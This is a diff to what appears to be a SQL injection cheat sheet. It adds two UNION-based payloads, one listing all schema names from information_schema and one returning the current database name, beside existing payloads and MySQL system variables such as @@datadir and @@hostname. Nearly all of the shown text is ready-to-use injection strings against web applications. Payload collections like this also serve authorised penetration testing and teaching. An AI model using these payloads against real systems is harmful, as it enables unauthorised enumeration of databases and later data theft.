@@ -65,6 +65,7 @@ Retrieve All Database Names
 ---------------------------
 ```sql
 'UNION+ALL+SELECT+NULL,NULL,concat(schema_name)+FROM+information_schema.schemata#
+'+UNION+ALL+SELECT+NULL,NULL,CONCAT('~',schema_name,'~'),NULL,NULL,NULL,NULL+FROM+INFORMATION_SCHEMA.SCHEMATA--+
 ```
 
 
@@ -73,6 +74,7 @@ Get Current Database Name and Additional Information
 ----------------------------------------------------
 ```sql
 '+UNION+ALL+SELECT+database(),NULL,NULL#
+'+UNION+ALL+SELECT+NULL,NULL,CONCAT('~',DATABASE(),'~'),NULL,NULL,NULL,NULL--+
 @@datadir
 @@hostname
 @@version
